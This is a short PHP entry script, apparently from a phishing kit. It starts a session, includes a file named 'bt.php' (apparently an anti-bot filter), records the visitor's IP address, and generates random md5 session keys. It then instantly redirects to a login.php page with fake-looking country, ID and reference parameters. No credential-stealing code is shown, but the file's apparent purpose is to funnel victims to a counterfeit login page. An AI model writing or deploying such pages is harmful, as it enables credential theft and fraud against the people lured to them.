<?php
session_start();
include ('bt.php');
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="refresh" content="0;URL=login.php?country=US&ID=PA324&Ref=#350BGH8S" /></head></html>
